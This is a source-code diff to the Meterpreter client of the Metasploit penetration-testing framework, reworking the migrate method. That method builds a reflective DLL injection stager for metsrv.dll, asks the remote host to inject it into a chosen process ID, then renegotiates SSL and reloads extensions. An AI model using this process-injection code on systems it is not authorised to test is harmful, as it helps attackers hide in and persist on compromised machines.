@@ -167,33 +167,47 @@ class ClientCore < Extension
 	#
 	def migrate( pid )
 		
-		c = Class.new( Msf::Payload )
+		# Create a new payload stub
+		c = Class.new( ::Msf::Payload )
+		c.include( ::Msf::Payload::Stager )
+		c.include( ::Msf::Payload::Windows::ReflectiveDllInject )
 		
-		c.include( Msf::Payload::Stager )
-		
-		c.include( Msf::Payload::Windows::ReflectiveDllInject )
-		
+		# Create the migrate stager
 		migrate_stager = c.new()
-		
 		migrate_stager.datastore['DLL'] = ::File.join( Msf::Config.install_root, "data", "meterpreter", "metsrv.dll" )
-		
 		payload = migrate_stager.stage_payload
 		
+		# Send the migration request
 		request = Packet.create_request( 'core_migrate' )
-		
 		request.add_tlv( TLV_TYPE_MIGRATE_PID, pid )
-		
 		request.add_tlv( TLV_TYPE_MIGRATE_LEN, payload.length )
-		
 		response = client.send_request( request )
-		
+	
+		# Stop the socket monitor
+		client.dispatcher_thread.kill if client.dispatcher_thread 
+
+		# flush the receive buffer just in case
+		buff = client.sock.get_once(-1, 1)
+
+		# Send the payload over SSL
 		client.sock.write( payload )
+		client.sock.flush
 		
+		# Now communicating with the new process
+		
+		# Renegotiate SSL over this socket
+		client.swap_sock_ssl_to_plain()
+		client.swap_sock_plain_to_ssl()
+		
+		# Restart the socket monitor
+		client.monitor_socket
+
 		# Give the stage some time to transmit
 		Rex::ThreadSafe.sleep( 5 )
 		
 		# Load all the extensions that were loaded in the previous instance
-		client.ext.aliases.keys.each { |e| 
+		client.ext.aliases.keys.each { |e|
+			$stderr.puts "loading extension #{e}"
 			client.core.use(e) 
 		}
 		
